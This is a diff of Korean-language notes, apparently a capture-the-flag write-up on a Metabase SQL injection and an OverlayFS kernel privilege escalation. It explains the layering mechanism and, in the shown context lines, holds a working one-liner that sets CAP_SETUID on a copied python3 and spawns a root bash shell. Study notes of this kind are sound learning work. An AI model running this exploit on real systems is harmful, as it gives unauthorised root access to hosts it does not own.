@@ -27,7 +27,10 @@
   - 하위 폴더에서 실행해야 함
 <br></br>
 - 권한 상승 원리
-  - 
+  - overlayFS: 하나의 디렉터리 트리가 다른 디렉터리 트리 위에 겹쳐지는 통합 마운트 파일 시스템
+    - 모든 수정 사항이 쓰기 가능한 상위 계층으로 이동, 하위 계층은 읽기 전용
+  - 하위 파일을 상위 계층으로 이동하여 공격함
+  - 즉 하위 디렉터리에 CAP_SETUID 같은 기능을 상위 계층으로 전달하여 실행하고 루트 권한을 얻는 원리
 ```
 unshare -rm sh -c
 "mkdir l u w m &&
@@ -36,7 +39,6 @@ setcap cap_setuid+eip l/python3;
 mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" &&
 u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
 ```
-<br></br>
   - unshare -rm sh: 새 사용자 네임스페이스 생성 후 새 파일 시스템 네임 스페이스를 마운트 함
   - mkdir l u w m: 각 이름의 디렉터리 생성
   - cp /u*/b*/p*3 l/: 각 패턴에 맞는 파일 복사
@@ -53,3 +55,8 @@ u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
 - metabase 취약점
   - db 유효성 검증 단계에서 sql injection을 하여 reverse shell 획득
 - 커널 취약점을 이용한 권한 상승
+  - namespace 생성
+  - namespace-root가 마운트 된 디렉터리에 overlayFS 생성
+  - lower layer 파이썬 바이너리에 CAP_SETUID 설정
+  - namespace-root가 상위 계층에 파이썬 바이너리를 push함
+  - 상위 계층에서 파이썬을 실행하여 루트 권한을 획득
